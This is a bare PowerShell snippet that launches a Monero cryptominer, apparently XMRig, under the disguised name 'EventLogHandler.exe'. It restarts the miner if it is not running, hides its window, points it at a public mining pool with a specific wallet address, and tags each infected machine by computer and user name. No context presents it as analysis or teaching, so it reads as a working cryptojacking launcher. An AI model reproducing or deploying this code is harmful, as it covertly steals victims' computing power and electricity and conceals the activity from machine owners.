if (-not (Get-Process -Name "EventLogHandler" -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath ".\EventLogHandler.exe" `
        -ArgumentList "--background --donate-level 1 -o fi.monero.herominers.com:1111 -u 4A4CJqUV3RrGbAfUdfopnKhQF8S3SYT88XRhGxeFWKUjhV9orrkNasmSGCjJoEkSskX8mGgX3Cueh4XQGh7AaNZf8BySS8F -p $($env:COMPUTERNAME)_$($env:USERNAME) -a rx/0 -k" `
        -WindowStyle Hidden
}
